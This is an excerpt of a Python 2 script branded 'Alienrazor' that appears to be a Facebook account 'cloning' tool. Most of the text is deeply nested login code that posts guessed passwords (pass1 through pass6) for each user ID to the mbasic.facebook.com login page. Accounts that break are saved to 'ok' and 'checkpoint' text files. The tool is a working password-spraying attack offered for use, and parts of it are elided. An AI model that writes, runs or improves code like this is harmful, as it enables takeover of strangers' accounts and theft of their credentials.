...
def main_system():
    ...
    print logo
    print ''
    print '\x1b[1;91m Alienrazor'
    print '\x1b[1;91m__________________________________________________________________'
    print '\x1b[1;96m[1]   Public Cloning      \x1b[1;92m(Login)'
    print '\x1b[1;96m[2]   Random Cloning     \x1b[1;92m (No Login)'
    print '\x1b[1;96m[3]   File Cloning       \x1b[1;92m (No Login)'
    print '\x1b[1;96m[4]   File Making Menu\x1b[1;92m    (Login)'
    print '\x1b[1;91m__________________________________________________________________'
    main_input()
...
def main_input():
    ...
    if mx == '1':
        print ''
        print '\x1b[1;94m Cheking Network....\x1b[1;92m'
        time.sleep(3)
        fb_menu()
    elif mx == '2':
        print ''
        print '\x1b[1;94m Cheking Network....\x1b[1;97m'
        time.sleep(3)
        numcloning()
    elif mx == '3':
        print ''
...
def mineExt():
    ...
    print g + '[=] Extracting From ALIEN : ' + my_line[:15]
    ...
    def main(arg):
        ...
        try:
            ...
            b = rana.post('https://mbasic.facebook.com/login.php', data = {
                ...
                'login': 'submit' })
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[ALIEN-OK] ' + uid + ' | ' + pass1
                ok = open('ALIEN-ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print '\x1b[1;91m[ALIEN-CP] ' + uid + ' | ' + pass1
                cp = open('ALIEN-cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                ...
                b = rana.post('https://mbasic.facebook.com/login.php', data = {
                    ...
                    'login': 'submit' })
                if 'c_user' in rana.cookies.get_dict().keys():
                    print '\x1b[1;92m[ALIEN-OK] ' + uid + ' | ' + pass2
                    ok = open('ALIEN-ok.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'checkpoint' in rana.cookies.get_dict().keys():
                    print '\x1b[1;91m[ALIEN-CP] ' + uid + ' | ' + pass2
                    cp = open('ALIEN-cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    b = rana.post('https://mbasic.facebook.com/login.php', data = {
                        ...
                        'login': 'submit' })
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print '\x1b[1;92m[ALIEN-OK] ' + uid + ' | ' + pass3
                        ok = open('ALIEN-ok.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'checkpoint' in rana.cookies.get_dict().keys():
                        print '\x1b[1;91m[ALIEN-CP] ' + uid + ' | ' + pass3
                        cp = open('ALIEN-cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        b = rana.post('https://mbasic.facebook.com/login.php', data = {
                            ...
                            'login': 'submit' })
                        if 'c_user' in rana.cookies.get_dict().keys():
                            print '\x1b[1;92m[ALIEN-OK] ' + uid + ' | ' + pass4
                            ok = open('ALIEN-ok.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'checkpoint' in rana.cookies.get_dict().keys():
                            print '\x1b[1;91m[ALIEN-CP] ' + uid + ' | ' + pass4
                            cp = open('ALIEN-cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            ...
                            b = rana.post('https://mbasic.facebook.com/login.php', data = {
                                ...
                                'login': 'submit' })
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print '\x1b[1;92m[ALIEN-OK] ' + uid + ' | ' + pass5
                                ok = open('ALIEN-ok.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'checkpoint' in rana.cookies.get_dict().keys():
                                print '\x1b[1;91m[ALIEN-CP] ' + uid + ' | ' + pass5
                                cp = open('ALIEN-cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                ...
                print '\x1b[1;97m[ALIEN-CP] ' + uid + ' | ' + pass1
                cp = open('ALIEN-cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
                ...
                if 'c_user' in rana.cookies.get_dict().keys():
                    ...
                    print '\x1b[1;97m[ALIEN-CP] ' + uid + ' | ' + pass2
                    cp = open('ALIEN-cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        ...
                        print '\x1b[1;97m[ALIEN-CP] ' + uid + ' | ' + pass3
                        cp = open('ALIEN-cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            ...
                            print '\x1b[1;97m[ALIEN-CP] ' + uid + ' | ' + pass4
                            cp = open('ALIEN-cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.append(uid + pass4)
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                print '\x1b[1;97m[ALIEN-CP] ' + uid + ' | ' + pass5
                                cp = open('ALIEN-cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.append(uid + pass5)
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                b = rana.post('https://mbasic.facebook.com/login.php', data = {
                                    ...
                                    'login': 'submit' })
                                if 'c_user' in rana.cookies.get_dict().keys():
                                    print '\x1b[1;92m[ALIEN-OK] ' + uid + ' | ' + pass6
                                    ok = open('IMTISZ-ok.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'checkpoint' in rana.cookies.get_dict().keys():
                                    print '\x1b[1;91m[ALIEN-CP] ' + uid + ' | ' + pass6
                                    cp = open('ALIEN-cp.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
